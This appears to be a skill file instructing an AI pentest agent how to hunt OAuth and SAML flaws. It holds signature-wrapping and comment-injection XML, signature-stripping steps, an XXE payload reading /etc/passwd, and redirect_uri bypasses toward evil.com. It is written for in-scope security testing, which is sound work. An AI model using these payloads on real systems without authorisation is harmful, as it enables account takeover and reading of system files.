---
name: hunt-federation
description: OAuth and SAML attack hunting - redirect_uri bypass, state CSRF, SAML XSW (XSW1-XSW8), signature stripping, comment injection. Wiki-first, FIND schema output.
---

# Hunt: OAuth / SAML / Federation

## Pre-Attack: Wiki Query (MANDATORY)
```
qmd_query "OAuth SAML SSO authentication" via wiki-search MCP -> read matching technique page if found.
```
Apply known redirect_uri bypass patterns and SAML XSW techniques already documented. Payload arsenal: `wiki/payloads/oauth-saml.md`.


**Self-heal:** If the wiki query returns nothing, create a stub `wiki/techniques/<area>/<slug>.md` (frontmatter + a `## Observed during <engagement>` section built from your findings) before proceeding, so the gap fills instead of silently recurring.

## Scope Check
- Confirm target is in scope
- Read Deadends.md - skip already-tested auth flows

## Attack Surface Signals
```
/oauth/authorize  /oauth/token  /oauth/callback  /auth/callback
/saml/  /saml/acs  /sso/saml  /auth/saml/callback
/login?redirect_uri=  /signin?next=
```

## SAML Attacks

### Attack 1: XSW - Signature Wrapping
```xml
<!-- Original: legit assertion by user@company.com -->
<!-- Modified: inject evil assertion with admin@company.com before the signed one -->
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>  <!-- Attacker-controlled -->
  </saml:Assertion>
  <saml:Assertion ID="legit">
    <NameID>user@company.com</NameID>
    <ds:Signature><!-- Valid, covers ID=legit --></ds:Signature>
  </saml:Assertion>
</saml:Response>
```
Use SAMLRaider Burp extension for automated XSW1-XSW8 testing.

### Attack 2: Signature Stripping
```bash
# 1. Decode
echo "BASE64_SAML" | base64 -d | xmllint --format - > saml.xml
# 2. Delete entire <Signature> element
# 3. Change NameID to admin@company.com
# 4. Re-encode
base64 -w0 saml.xml
# 5. POST -- if server doesn't verify signature = Critical ATO
```

### Attack 3: Comment Injection
```xml
<NameID>admin<!---->@company.com</NameID>
<!-- Signature covers "admin<!---->@company.com" but parser sees "admin@company.com" -->
```

### Attack 4: XXE in SAML Assertion
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:Assertion><NameID>&xxe;</NameID></saml:Assertion>
```

## OAuth Attacks

### redirect_uri Bypass (highest yield)
```
Try: redirect_uri=https://legit.com.evil.com
Try: redirect_uri=https://legit.com/callback/../../../evil
Try: redirect_uri=https://legit.com&redirect_uri=https://evil.com  (param pollution)
Try: encoded chars %2F %40 %23
```

### State CSRF
- Remove `state` parameter entirely - does the flow complete?
- Is `state` validated server-side or only client-side?

### Nonce Replay / Referrer Leak
- Check if on-page resources receive full Referer header containing the access token/code in URL
- Language switchers, analytics, social share buttons loaded post-auth are common culprits

## Methodology
1. Map all OAuth/SAML entry points
2. Capture a valid SAMLResponse via Burp - decode Base64, inspect XML
3. Test SAML: XSW (SAMLRaider), signature stripping, comment injection, XXE
4. Test OAuth: redirect_uri variations, state removal, nonce replay
5. Check `.well-known/openid-configuration` for OIDC surface
6. Check `client_secret` in JS bundles or APK resources
7. Verify impact: demonstrate ATO or privilege escalation on test account
8. **Distill to wiki (when confirmed):** if the finding is a reusable XSW variant or OAuth bypass, stage a GENERIC wiki candidate now (no client host): `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/web/oauth-attacks.md` (SAML findings: `--target-page techniques/web/saml-attacks.md`). Promote later via `scripts/wiki-promote.py`.

## FIND Output

If SAML XSW or signature stripping succeeds (admin session obtained):
```
Create Vulns/Research/FIND-XXX-CRITICAL-saml-auth-bypass-<host>.md
Add row to Vuln-index.md: CRITICAL
```

If OAuth redirect_uri bypass succeeds (code/token captured):
```
Create Vulns/Research/FIND-XXX-HIGH-oauth-redirect-bypass-<host>.md
Add row to Vuln-index.md: HIGH
```

If path exhausted:
```
Append to Deadends.md: - [ ] SAML/OAuth on <host> -- XSW rejected, signatures verified, redirect_uri strictly validated
```

Report: Status + files created.
